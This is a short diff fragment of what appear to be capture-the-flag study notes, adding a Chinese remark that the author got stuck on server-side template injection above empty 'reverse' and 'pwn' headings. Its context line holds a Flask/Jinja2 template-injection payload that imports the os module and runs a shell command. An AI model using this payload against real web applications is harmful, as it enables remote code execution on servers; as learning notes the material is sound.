@@ -172,6 +172,9 @@ users = {
 
 `url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()`
 
+ssti不下去了,
+
+### 
 # reverse
 
 # pwn
